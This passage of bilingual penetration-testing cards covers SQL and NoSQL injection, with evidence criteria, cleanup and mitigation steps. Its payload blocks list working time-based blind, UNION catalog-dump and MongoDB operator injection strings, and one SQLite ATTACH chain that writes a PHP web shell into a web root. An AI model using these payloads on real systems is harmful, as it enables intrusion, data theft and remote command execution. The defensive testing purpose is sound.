opsecTips.en: Terminate sessions still in sleep or benchmark, drain the test connection pool, restore execution limits, and delete WAF and performance-sampling records.

name.zh: MySQL 时间盲注的 WAF 变体
name.en: WAF Variants for MySQL Time-Based Blind Injection

description.zh: 使用派生表、SLEEP、IF 和 BENCHMARK 的不同表达式位置建立时间信号，验证 WAF 与 MySQL 解析差异。
description.en: Uses derived tables, SLEEP, IF, and BENCHMARK in different expression positions to build timing signals and test WAF/MySQL parsing differences.

subCategory.zh: 时间盲注 WAF 变体

overview.zh: MySQL 时间盲注的 WAF 变体聚焦变体改变延时函数的嵌套位置而非成功标准；必须以统计基线、真假分支和数据库会话共同证明。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。
overview.en: WAF Variants for MySQL Time-Based Blind Injection focuses on this boundary: Variants change delay-function nesting rather than the success criterion; prove them with a timing baseline, true/false branches, and database sessions together. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control.

vulnerability.zh: 拼接式 MySQL 表达式允许昂贵函数进入派生表或条件函数，固定位置签名无法覆盖等价嵌套，弱超时还会放大影响。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。
vulnerability.en: Concatenated MySQL expressions allow expensive functions in derived tables or conditionals, fixed-position signatures miss equivalent nesting, and weak timeouts amplify impact. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone.

exploitation.zh: 交错采集正常、恒真和恒假短延时样本，每种嵌套只验证一次；BENCHMARK 仅用低迭代数观察趋势。 数据库会话或慢查询日志应只在恒真分支显示 SLEEP 或受控 BENCHMARK；网络慢响应和连接池等待必须排除。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。
exploitation.en: Interleave normal, true, and false short-delay samples and validate each nesting once; use BENCHMARK only with low iterations to observe a trend. Database sessions or slow-query logs should show SLEEP or controlled BENCHMARK only for the true branch; exclude network slowness and pool waits. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain.

mitigation.zh: 参数化查询并设置语句超时、资源组与并发上限；统一解码后将异常函数结构作为 WAF 补充信号。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。
mitigation.en: Parameterize queries and configure statement timeouts, resource groups, and concurrency limits; after canonical decoding, use anomalous function structure as a supplemental WAF signal. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone.

title.zh: 确认时间盲注 WAF 变体前置条件
title.en: Confirm Time-Based Blind Injection WAF Variants prerequisites

description.zh: 变体改变延时函数的嵌套位置而非成功标准；必须以统计基线、真假分支和数据库会话共同证明。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。
description.en: Variants change delay-function nesting rather than the success criterion; prove them with a timing baseline, true/false branches, and database sessions together. Record the database product, version, driver, field type, normal response, and server-log baseline.

title.zh: 执行受控时间盲注 WAF 变体探针
title.en: Run a controlled Time-Based Blind Injection WAF Variants probe

description.zh: 交错采集正常、恒真和恒假短延时样本，每种嵌套只验证一次；BENCHMARK 仅用低迭代数观察趋势。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。
description.en: Interleave normal, true, and false short-delay samples and validate each nesting once; use BENCHMARK only with low iterations to observe a trend. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request.

attackChain.payload:
1’ AND (SELECT * FROM (SELECT(SLEEP(3)))a)--
1’ AND SLEEP(3)--
1’ OR (SELECT * FROM (SELECT(SLEEP(3)))a)--
1’ OR SLEEP(3)--
1’ AND IF(1=1,SLEEP(3),0)--
1’ OR IF(1=1,SLEEP(3),0)--
1’ AND BENCHMARK(10000000,SHA1(‘test’))--
1’ SELECT SLEEP(3)--
1’ SELECT IF(1=1,SLEEP(3),0)--
1’ SELECT BENCHMARK(10000000,SHA1(‘test’))--

title.zh: 核对时间盲注 WAF 变体成功证据
title.en: Verify Time-Based Blind Injection WAF Variants evidence

description.zh: 数据库会话或慢查询日志应只在恒真分支显示 SLEEP 或受控 BENCHMARK；网络慢响应和连接池等待必须排除。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。
description.en: Database sessions or slow-query logs should show SLEEP or controlled BENCHMARK only for the true branch; exclude network slowness and pool waits. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter.

title.zh: 修复并回归时间盲注 WAF 变体
title.en: Remediate and regress Time-Based Blind Injection WAF Variants

description.zh: 参数化查询并设置语句超时、资源组与并发上限；统一解码后将异常函数结构作为 WAF 补充信号。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。
description.en: Parameterize queries and configure statement timeouts, resource groups, and concurrency limits; after canonical decoding, use anomalous function structure as a supplemental WAF signal. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization.

review.rationale: 这些是 MySQL 时间函数请求载荷，不应迁到 WAFW00F 或 SQLMap 工具卡。

prerequisites.zh: 确认目标 DBMS 支持的引号与注释约定，并从应用查询或错误日志确定所需括号深度。
prerequisites.en: Confirm the target DBMS's quote and comment conventions, and determine the required parenthesis depth from application query or error logs.

prerequisites.zh: 对每个闭合候选只改变一个语法元素，并准备同一闭合下的恒真、恒假与正常请求三组样本。
prerequisites.en: Change only one syntax element per closure candidate and prepare true, false, and normal samples under the same closure.

analysis.zh: 阳性证据是最小引号、括号和注释组合使恒真谓词恢复预期标记行，而恒假谓词稳定排除该行，后端查询记录同时显示闭合成功。两个分支都报错、两个分支都返回相同页面、注释符仅被回显、或一次状态码变化不属于布尔盲注证据。
analysis.en: Positive evidence is the minimal quote, parenthesis, and comment combination restoring an expected marker row for the true predicate while the false predicate reproducibly excludes it, with backend query records showing successful closure. Both branches erroring, both returning the same page, a reflected comment token, or one status-code change is not Boolean-blind evidence.

opsecTips.zh: 确定一个最小闭合和一组真/假差异后停止，不继续增加括号、分号或替换注释风格。
opsecTips.en: Stop after determining one minimal closure and one true/false differential; do not add parentheses, semicolons, or alternate comment styles.

opsecTips.zh: 回滚标记数据，清除测试响应缓存与详细 SQL 日志，并恢复统一错误处理和参数绑定。
opsecTips.en: Roll back marker data, clear test response caches and verbose SQL logs, and restore uniform error handling and parameter binding.

name.zh: 布尔条件与闭合变体

description.zh: 组合井号、双连字符、分号与不同括号闭合方式，用真假条件定位字面量和嵌套查询边界。
description.en: Combines hash comments, double hyphens, semicolons, and parenthesis closures with true and false predicates to locate query boundaries.

overview.zh: 布尔条件与闭合变体聚焦原名称只是语料来源，审校后改为具体用途；从一个引号与一种注释规则开始，逐步调整括号深度。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。
overview.en: Boolean Predicate and Closure Variants focuses on this boundary: The source-branded name did not describe purpose; start with one quote and comment convention and adjust parenthesis depth incrementally. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control.

vulnerability.zh: 字符串拼接允许输入关闭字面量、注释剩余 SQL 或补齐嵌套括号；不同 DBMS 对注释尾随空白和分号规则不同。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。
vulnerability.en: String concatenation lets input close literals, comment remaining SQL, or balance parentheses; DBMS products differ in comment whitespace and semicolon rules. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone.

exploitation.zh: 对每一种闭合深度同时发送结构相同的恒真和恒假条件，每次只增加一个右括号并记录错误位置。 真假条件必须导致可重复业务记录差异并对应最终 SQL；两个请求都报错或只改变通用错误页都不能确认。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。
exploitation.en: For each closure depth, send structurally identical true and false conditions, add one closing parenthesis at a time, and record error positions. True and false conditions must produce repeatable business-record differences matching final SQL; both requests failing or changing only a generic error page is insufficient. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain.

mitigation.zh: 参数化查询并对数字、枚举执行服务端类型转换，不依赖转义或注释黑名单，并回归所有已识别闭合深度。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。
mitigation.en: Parameterize queries, convert numeric and enum input server-side, avoid escaping or comment blacklists, and regress all identified closure depths. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone.

title.zh: 确认布尔盲注闭合探测前置条件
title.en: Confirm Boolean Blind Closure Probing prerequisites

description.zh: 原名称只是语料来源，审校后改为具体用途；从一个引号与一种注释规则开始，逐步调整括号深度。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。
description.en: The source-branded name did not describe purpose; start with one quote and comment convention and adjust parenthesis depth incrementally. Record the database product, version, driver, field type, normal response, and server-log baseline.

title.zh: 执行受控布尔盲注闭合探测探针
title.en: Run a controlled Boolean Blind Closure Probing probe

description.zh: 对每一种闭合深度同时发送结构相同的恒真和恒假条件，每次只增加一个右括号并记录错误位置。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。
description.en: For each closure depth, send structurally identical true and false conditions, add one closing parenthesis at a time, and record error positions. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request.

title.zh: 核对布尔盲注闭合探测成功证据
title.en: Verify Boolean Blind Closure Probing evidence

description.zh: 真假条件必须导致可重复业务记录差异并对应最终 SQL；两个请求都报错或只改变通用错误页都不能确认。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。
description.en: True and false conditions must produce repeatable business-record differences matching final SQL; both requests failing or changing only a generic error page is insufficient. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter.

title.zh: 修复并回归布尔盲注闭合探测
title.en: Remediate and regress Boolean Blind Closure Probing

description.zh: 参数化查询并对数字、枚举执行服务端类型转换，不依赖转义或注释黑名单，并回归所有已识别闭合深度。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。
description.en: Parameterize queries, convert numeric and enum input server-side, avoid escaping or comment blacklists, and regress all identified closure depths. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization.

review.rationale: 原字符串均为同一布尔闭合技术的 Payload，已去除来源品牌化命名。

prerequisites.zh: 使用独立 MongoDB 测试集合和合成账户，确认 API 是否把 JSON 对象直接传给驱动及其操作符清洗配置。
prerequisites.en: Use an isolated MongoDB test collection and synthetic accounts, confirming whether the API passes JSON objects directly to the driver and how operators are sanitized.

prerequisites.zh: 开启带请求令牌的命令审计或短期 profiler，并为 $ne、$gt、$regex、$exists 和 $where 准备匹配与不匹配对照。
prerequisites.en: Enable request-token command auditing or a short-lived profiler, and prepare matching and nonmatching controls for $ne, $gt, $regex, $exists, and $where.

analysis.zh: 阳性是原本应为标量的字段被解析为 MongoDB 操作符对象，使查询命中只能由合成标记识别的文档或绕过测试账户的恒假凭据，并由数据库命令记录确认。JSON 被接受、返回 400、正则耗时、输入回显、或普通空密码测试成功都不是操作符注入证据。
analysis.en: Positive evidence is a field expected to be scalar being parsed as a MongoDB operator object and matching a uniquely marked synthetic document or bypassing a deliberately false test credential, confirmed by database command records. JSON acceptance, HTTP 400, regex latency, input reflection, or success with an ordinary blank-password test is not operator-injection evidence.

opsecTips.zh: 第一个合成文档或测试账户匹配后停止，不在大型集合运行 $where 或无界正则，也不读取真实用户记录。
opsecTips.en: Stop after the first synthetic document or test-account match; do not run $where or unbounded regex against a large collection or read real user records.

opsecTips.zh: 删除测试集合与合成账户，关闭 profiler，清除审计令牌，并恢复操作符白名单和输入 schema。
opsecTips.en: Drop the test collection and synthetic accounts, disable the profiler, clear audit tokens, and restore operator allowlists and the input schema.

name.zh: MongoDB 查询运算符注入

description.zh: 用 $gt、$ne、$regex、$exists、$where 和逻辑对象替换预期标量，验证 JSON 是否直接变成 MongoDB 条件。
description.en: Replaces expected scalars with $gt, $ne, $regex, $exists, $where, and logical objects to test whether JSON becomes MongoDB criteria.

overview.zh: MongoDB 查询运算符注入聚焦NoSQL 注入不依赖 SQL 引号；应区分 JSON 对象运算符注入与旧式 JavaScript/$where 字符串注入，并记录驱动配置。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。
overview.en: MongoDB Query-Operator Injection focuses on this boundary: NoSQL injection does not require SQL quotes; distinguish JSON operator injection from legacy JavaScript or $where string injection and record driver settings. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control.

vulnerability.zh: 接口期望字符串却接受对象，并将其直接传给 MongoDB 查询 API；启用 $where 还会引入服务端脚本求值。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。
vulnerability.en: The API expects a string but accepts an object and passes it to a MongoDB query API; enabling $where also introduces server-side script evaluation. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone.

exploitation.zh: 用测试账户发送合法标量、同值对象和确定不匹配的运算符负对照，每次只修改一个身份字段。 核对最终查询对象、登录主体和命中记录 ID；HTTP 200、统一成功页面或类型错误不能单独证明认证绕过。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。
exploitation.en: For a test account, send a valid scalar, an equivalent object, and a guaranteed nonmatching operator control while changing only one identity field. Inspect the final query object, authenticated principal, and matched record IDs; HTTP 200, a generic success page, or a type error alone proves nothing. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain.

mitigation.zh: 使用严格 JSON Schema，只接受有界字符串并拒绝对象、数组和美元键；固定查询结构并禁用不需要的 $where。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。
mitigation.en: Use a strict JSON Schema, accept only bounded strings, reject objects, arrays, and dollar-prefixed keys, fix the query shape, and disable unnecessary $where. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone.

title.zh: 确认MongoDB 运算符注入前置条件
title.en: Confirm MongoDB Operator Injection prerequisites

description.zh: NoSQL 注入不依赖 SQL 引号；应区分 JSON 对象运算符注入与旧式 JavaScript/$where 字符串注入，并记录驱动配置。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。
description.en: NoSQL injection does not require SQL quotes; distinguish JSON operator injection from legacy JavaScript or $where string injection and record driver settings. Record the database product, version, driver, field type, normal response, and server-log baseline.

title.zh: 执行受控MongoDB 运算符注入探针
title.en: Run a controlled MongoDB Operator Injection probe

description.zh: 用测试账户发送合法标量、同值对象和确定不匹配的运算符负对照，每次只修改一个身份字段。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。
description.en: For a test account, send a valid scalar, an equivalent object, and a guaranteed nonmatching operator control while changing only one identity field. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request.

title.zh: 核对MongoDB 运算符注入成功证据
title.en: Verify MongoDB Operator Injection evidence

description.zh: 核对最终查询对象、登录主体和命中记录 ID；HTTP 200、统一成功页面或类型错误不能单独证明认证绕过。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。
description.en: Inspect the final query object, authenticated principal, and matched record IDs; HTTP 200, a generic success page, or a type error alone proves nothing. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter.

title.zh: 修复并回归MongoDB 运算符注入
title.en: Remediate and regress MongoDB Operator Injection

description.zh: 使用严格 JSON Schema，只接受有界字符串并拒绝对象、数组和美元键；固定查询结构并禁用不需要的 $where。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。
description.en: Use a strict JSON Schema, accept only bounded strings, reject objects, arrays, and dollar-prefixed keys, fix the query shape, and disable unnecessary $where. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization.

review.rationale: 这些 JSON 是 MongoDB 查询边界载荷，不是 mongo 客户端命令。

prerequisites.zh: 先识别唯一目标 DBMS，只使用对应的 SLEEP、WAITFOR DELAY 或 pg_sleep 方言，并验证驱动语句位置。
prerequisites.en: Identify the single target DBMS first, use only its SLEEP, WAITFOR DELAY, or pg_sleep dialect, and verify the driver's statement placement.

prerequisites.zh: 收集足够的正常时延分布和数据库会话日志，以随机顺序交错运行短延时恒真、恒假和无延时样本。
prerequisites.en: Collect a sufficient normal-latency distribution and database-session logs, then interleave short-delay true, false, and no-delay samples in randomized order.

analysis.zh: 阳性要求恒真样本的延迟分布相对恒假与无延时样本显著分离，并且每次慢响应都能关联到后端延时函数执行。单次超时、跨方言语法错误、网络峰值、WAF 挑战、锁等待、冷缓存或连接池饱和都是假阳性边界。
analysis.en: Positive evidence requires the true samples' latency distribution to separate significantly from false and no-delay controls, with every slow response correlated to backend delay-function execution. One timeout, cross-dialect syntax errors, network spikes, WAF challenges, lock waits, cold caches, or connection-pool saturation are false-positive boundaries.

opsecTips.zh: 达到事先定义的样本数和置信阈值后停止，不把延时从短值提升到语料中的最大值。
opsecTips.en: Stop when the predefined sample count and confidence threshold are reached; do not raise the delay from the short test value to the corpus maximum.

opsecTips.zh: 取消标记会话，排空连接池，恢复数据库语句超时，并删除采样结果中的请求标识与临时指标。
opsecTips.en: Cancel tagged sessions, drain the connection pool, restore database statement timeouts, and delete request identifiers and temporary metrics from the sample set.

name.zh: 跨数据库时间盲注探测

description.zh: 按 MySQL、SQL Server 和 PostgreSQL 方言使用 SLEEP、WAITFOR DELAY 与 pg_sleep，以统计证据验证无回显注入。
description.en: Uses SLEEP, WAITFOR DELAY, or pg_sleep according to MySQL, SQL Server, or PostgreSQL dialect to validate non-reflected injection statistically.

overview.zh: 跨数据库时间盲注探测聚焦通用卡统一的是证据方法而不是混用方言；先识别数据库，再只选择对应延时函数并交错采样。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。
overview.en: Cross-DBMS Time-Based Blind SQL Injection focuses on this boundary: The shared element is the evidence method, not mixed dialects; identify the database, choose its delay function, and interleave samples. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control.

vulnerability.zh: 拼接查询可在条件为真时调用延时或高成本函数，即使无回显也通过时间泄露布尔结果，并可能占用连接资源。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。
vulnerability.en: Concatenated queries can call a delay or expensive function on a true condition, leaking a Boolean result without reflection and consuming connection resources. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone.

exploitation.zh: 随机交错正常、恒真短延时和恒假短延时，多次采样并计算中位数与高分位，同时记录数据库执行时间。 数据库日志必须只在恒真分支执行延时函数；网络抖动、锁等待、缓存和应用超时均需被排除。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。
exploitation.en: Randomly interleave normal, true short-delay, and false short-delay requests, collect repeated samples, calculate medians and high percentiles, and record database time. Database logs must show delay execution only for the true branch; exclude network jitter, lock waits, caching, and application timeouts. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain.

mitigation.zh: 参数化查询、严格类型绑定，设置语句超时、资源组和连接池上限，监控延时函数及条件化长查询。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。
mitigation.en: Parameterize queries, enforce strict types, configure statement timeouts, resource groups, and pool limits, and monitor delay functions and conditional long queries. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone.

title.zh: 确认跨数据库时间盲注前置条件
title.en: Confirm Cross-DBMS Time-Based Blind Injection prerequisites

description.zh: 通用卡统一的是证据方法而不是混用方言；先识别数据库，再只选择对应延时函数并交错采样。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。
description.en: The shared element is the evidence method, not mixed dialects; identify the database, choose its delay function, and interleave samples. Record the database product, version, driver, field type, normal response, and server-log baseline.

title.zh: 执行受控跨数据库时间盲注探针
title.en: Run a controlled Cross-DBMS Time-Based Blind Injection probe

description.zh: 随机交错正常、恒真短延时和恒假短延时，多次采样并计算中位数与高分位，同时记录数据库执行时间。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。
description.en: Randomly interleave normal, true short-delay, and false short-delay requests, collect repeated samples, calculate medians and high percentiles, and record database time. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request.

attackChain.payload:
'||SELECT(1)AND(SELECT(1)FROM(SELECT(SLEEP(5)))a)||'
1;SELECT SLEEP(5)--
1' SELECT SLEEP(5)--
1" SELECT SLEEP(5)--
1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
1 AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES A, INFORMATION_SCHEMA.TABLES B, INFORMATION_SCHEMA.TABLES C)--
1;WAITFOR DELAY '0:0:5'--
1';WAITFOR DELAY '0:0:5'--
1";WAITFOR DELAY '0:0:5'--
pg_sleep(5)--
1;SELECT PG_SLEEP(5)--
1' AND PG_SLEEP(5)--
1 AND (SELECT 1 FROM PG_SLEEP(5))--

title.zh: 核对跨数据库时间盲注成功证据
title.en: Verify Cross-DBMS Time-Based Blind Injection evidence

description.zh: 数据库日志必须只在恒真分支执行延时函数；网络抖动、锁等待、缓存和应用超时均需被排除。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。
description.en: Database logs must show delay execution only for the true branch; exclude network jitter, lock waits, caching, and application timeouts. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter.

title.zh: 修复并回归跨数据库时间盲注
title.en: Remediate and regress Cross-DBMS Time-Based Blind Injection

description.zh: 参数化查询、严格类型绑定，设置语句超时、资源组和连接池上限，监控延时函数及条件化长查询。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。
description.en: Parameterize queries, enforce strict types, configure statement timeouts, resource groups, and pool limits, and monitor delay functions and conditional long queries. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization.

review.rationale: 跨 DBMS 延时函数共享同一盲注证据模型，按方言选择后仍是 Payload。

prerequisites.zh: 依据 sqlite_version、sqlite_master、pragma_table_info 和 ATTACH 等语法逐行重新识别方言，不沿用原 DB2/Cassandra/BigQuery 标签。
prerequisites.en: Reidentify the dialect line by line from syntax such as sqlite_version, sqlite_master, pragma_table_info, and ATTACH, without inheriting the original DB2/Cassandra/BigQuery label.

prerequisites.zh: 把只读目录探针与文件写入链放入不同审批和沙箱；写入分支只能使用可销毁 SQLite 副本及专用临时目录。
prerequisites.en: Place read-only catalog probes and file-write chains under separate approvals and sandboxes; the write branch may use only a disposable SQLite copy and dedicated temporary directory.

analysis.zh: 本条拆分的阳性证据是每段语法被路由到实际方言和影响模型：只读分支只能返回合成 sqlite_master 标记，写入分支必须由独立审计确认只在临时路径产生固定文件。原标签匹配、普通语法错误、返回任意版本字符串、ATTACH 被拒绝或仅生成 SQL 文本都不是相应能力的证明。
analysis.en: Positive evidence for the split is each fragment being routed to its actual dialect and impact model: the read-only branch may return only a synthetic sqlite_master marker, while the write branch requires separate auditing of a fixed file created solely in the temporary path. Matching the original label, generic syntax errors, any version string, denied ATTACH, or merely generating SQL text does not prove the corresponding capability.

opsecTips.zh: 审校到 ATTACH 或文件写入语句时停止于拆分边界，未经独立写入验证流程不得执行。
opsecTips.en: Stop at the split boundary when review reaches ATTACH or file-write statements; do not execute them without the separate write-validation workflow.

opsecTips.zh: 删除 SQLite 副本、附加数据库和临时目录，撤销进程写权限，并清除错误的 DBMS 标签缓存与测试路由记录。
opsecTips.en: Delete SQLite copies, attached databases, and the temporary directory, revoke process write permissions, and clear cached incorrect DBMS labels and test-routing records.

name.zh: 误标数据库混合集（待拆分）

description.zh: 名称声称 DB2、Cassandra 与 BigQuery，实际却主要是 SQLite 系统表、通用 INFORMATION_SCHEMA 和 SQLite 文件写入链。
description.en: The name claims DB2, Cassandra, and BigQuery, but the content is mainly SQLite catalogs, generic INFORMATION_SCHEMA, and a SQLite file-write chain.

subCategory.zh: 数据库方言内容纠错与拆分

overview.zh: 误标数据库混合集（待拆分）聚焦sqlite_version、sqlite_master、pragma_table_info 和 ATTACH 均指向 SQLite，原标签没有命令支撑，继续聚合会误导。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。
overview.en: Mislabeled Mixed-Database Corpus (Split Required) focuses on this boundary: sqlite_version, sqlite_master, pragma_table_info, and ATTACH all indicate SQLite, leaving the original label unsupported and misleading. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control.

vulnerability.zh: 数据库目录、文件权限和多语句能力完全不同；混合卡会把语法错误误判为防护，并把只读探测与文件写入混在一起。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。
vulnerability.en: Catalogs, file permissions, and multi-statement capabilities differ; a mixed card confuses syntax errors with controls and combines read-only probes with file writes. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone.

exploitation.zh: 将 SQLite 版本和目录行路由到 SQLite 卡，兼容的目录 UNION 行路由到 UNION 卡，ATTACH/CREATE/INSERT 链路由到堆叠影响卡。 每个目标卡必须单独确认数据库产品、查询上下文和权限；不得按原错误标题批量执行，也不能以其他方言报错定性。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。
exploitation.en: Route SQLite version and catalog lines to the SQLite card, compatible catalog UNION lines to UNION, and ATTACH/CREATE/INSERT to the stacked-impact card. Each target card must separately confirm product, query context, and privileges; never batch-run under the incorrect title or classify cross-dialect errors as evidence. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain.

mitigation.zh: 除参数化外，限制 SQLite 文件和 Web 根写权限，关闭不需要的多语句，并要求名称、方言和引用一致后发布。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。
mitigation.en: Besides parameterization, restrict SQLite file and web-root writes, disable unnecessary multi-statements, and require title, dialect, and references to agree before publication. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone.

title.zh: 确认数据库方言内容纠错与拆分前置条件
title.en: Confirm Database-Dialect Correction and Split prerequisites

description.zh: sqlite_version、sqlite_master、pragma_table_info 和 ATTACH 均指向 SQLite，原标签没有命令支撑，继续聚合会误导。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。
description.en: sqlite_version, sqlite_master, pragma_table_info, and ATTACH all indicate SQLite, leaving the original label unsupported and misleading. Record the database product, version, driver, field type, normal response, and server-log baseline.

title.zh: 执行受控数据库方言内容纠错与拆分探针
title.en: Run a controlled Database-Dialect Correction and Split probe

description.zh: 将 SQLite 版本和目录行路由到 SQLite 卡，兼容的目录 UNION 行路由到 UNION 卡，ATTACH/CREATE/INSERT 链路由到堆叠影响卡。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。
description.en: Route SQLite version and catalog lines to the SQLite card, compatible catalog UNION lines to UNION, and ATTACH/CREATE/INSERT to the stacked-impact card. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request.

attackChain.payload:
1 UNION SELECT sqlite_version()--
1 UNION SELECT sql FROM sqlite_master--
1 UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table'--
1 UNION SELECT group_concat(name) FROM pragma_table_info('users')--
ATTACH DATABASE '/var/www/html/shell.php' AS lol;CREATE TABLE lol.pwn(dataz text);INSERT INTO lol.pwn(dataz) VALUES('<?php system(["cmd"]);?>');--
1 UNION SELECT table_name FROM INFORMATION_SCHEMA.TABLES--
1 UNION SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users'--

title.zh: 核对数据库方言内容纠错与拆分成功证据
title.en: Verify Database-Dialect Correction and Split evidence

description.zh: 每个目标卡必须单独确认数据库产品、查询上下文和权限；不得按原错误标题批量执行，也不能以其他方言报错定性。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。
description.en: Each target card must separately confirm product, query context, and privileges; never batch-run under the incorrect title or classify cross-dialect errors as evidence. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter.

title.zh: 修复并回归数据库方言内容纠错与拆分
title.en: Remediate and regress Database-Dialect Correction and Split

description.zh: 除参数化外，限制 SQLite 文件和 Web 根写权限，关闭不需要的多语句，并要求名称、方言和引用一致后发布。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。
description.en: Besides parameterization, restrict SQLite file and web-root writes, disable unnecessary multi-statements, and require title, dialect, and references to agree before publication. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization.

review.rationale: 原标签与命令不符，且只读目录查询与文件写入链前置条件不同，必须拆分。

prerequisites.zh: 为每种 DBMS 使用独立可销毁实例，先确认驱动允许多语句，并仅以短延时第二语句建立只读证明。
prerequisites.en: Use a separate disposable instance for each DBMS, first confirm that the driver permits multiple statements, and establish read-only proof only with a short-delay second statement.

prerequisites.zh: 为 xp_cmdshell、LOAD_FILE 和 OUTFILE 分别记录功能开关、数据库角色、服务账户及文件系统权限，不共享前置条件。
prerequisites.en: Record feature switches, database roles, service identities, and filesystem permissions separately for xp_cmdshell, LOAD_FILE, and OUTFILE; do not share prerequisites.

analysis.zh: 阳性必须按拆分层级判定：短延时且有会话审计只能证明第二语句执行；命令、读文件或写文件能力还必须在各自隔离流程中产生唯一无害标记和系统审计事件。模型或页面回显 SQL、一次慢响应、权限错误、空结果、虚构命令输出或数据库功能已关闭都不是高影响链成功。
analysis.en: Positive evidence must be evaluated per split tier: a short tagged delay proves only second-statement execution, while command, file-read, or file-write capability additionally requires a unique harmless marker and system audit event in its own isolated workflow. SQL reflected by a model or page, one slow response, permission errors, empty results, fabricated command output, or a disabled database feature is not a successful high-impact chain.

